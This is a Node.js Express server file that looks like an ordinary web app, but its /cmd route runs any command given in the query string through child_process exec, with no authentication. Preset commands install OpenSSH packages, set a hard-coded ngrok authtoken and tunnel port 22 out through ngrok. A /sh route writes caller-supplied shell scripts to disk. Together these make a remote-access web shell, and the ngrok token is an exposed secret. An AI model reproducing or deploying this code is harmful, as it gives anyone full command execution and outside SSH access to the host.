const express = require('express')
var path = require('path')
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { exec } = require('child_process');
const fs = require('fs');


const port = process.env.PORT || 9000;
const app = express();


// 使用 body-parser 中间件解析请求体
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieParser());

app.set('views', path.join(__dirname, 'views'))
app.set('view engine', 'ejs')

app.enable('trust proxy')
app.use(express.static(path.join(__dirname, 'public')));
app.use('/js', express.static(path.join(__dirname, 'static/js')));
app.use('/css', express.static(path.join(__dirname, 'static/css')));
app.use('/img', express.static(path.join(__dirname, 'static/img')));

app.use(express.query());

app.get('/', (req, res) => {
  res.header('Cache-Control', 'no-cache')
  res.render('index', { currentTime: new Date() })
});
app.get('/cmd', async (req, res) => {
  res.header('Content-type', 'text/plain; charset=utf-8')
    var c = req.query.c
  if (typeof c == 'string' && c) {
    if(c == 'openssh-server'){
      c = 'dpkg -i openssh-server_7.9p1-10+deb10u2_amd64.deb'
    }else if(c == 'openssh-sftp-server'){
      c = 'dpkg -i openssh-sftp-server_7.9p1-10+deb10u2_amd64.deb'
    }else if(c == 'libwrap0'){
      c = 'dpkg -i libwrap0_7.6.q-28_amd64.deb'
    }else if(c == 'ngrok-a'){
      c = 'ngrok config add-authtoken "2RkIiHPgfucdreF63Z5L8P1BR3V_5RpsFfVRQNyDBSgTyUBxr"'
    }else if(c == 'ngrok-d'){
      c = 'nohup ngrok tcp 22 &'
    }
    exec(c, (error, stdout, stderr) => {
      if (error) {
        res.statusCode = 500;
        res.send(`执行命令时出错：${error}`);
        return;
      }
      res.send(`标准输出：${stdout}\n错误输出：${stderr}`);
    });
  }else{
    res.send('缺少 command 参数');
  }
});
app.get('/sh', async (req, res) => {
  res.header('Content-type', 'text/plain; charset=utf-8')
  var n = req.query.n || 'bs'
  if (req.query.c instanceof Array && req.query.n) {
    fs.writeFileSync(n+".sh", req.query.c.join("\n\n"))
    res.send(`已生成：${n}.sh`);
  }else{
    res.send('缺少 c 参数');
  }
});
app.listen(port, () => {
  console.log(`[server]: Server is running at http://localhost:${port}`);
});


module.exports = app;
